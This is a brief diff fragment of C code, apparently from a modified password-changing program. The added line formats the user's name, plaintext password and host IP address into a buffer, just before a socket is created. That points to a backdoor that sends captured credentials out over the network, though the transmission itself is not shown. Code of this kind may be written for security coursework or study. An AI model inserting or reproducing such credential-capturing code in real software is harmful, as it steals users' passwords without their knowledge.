@@ -96,7 +96,7 @@ At line ~210 right above the new_password function is where I put this function 
 	    char buffer[256];
 	    char * ip;
 	    ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
-	    //SNPRINT
+	    int j = snprintf(buffer, 256, "%s:%s:%s\n", name, password, ip);
 
 	    /* Make Socket */
 	    int sock = 0, valread;
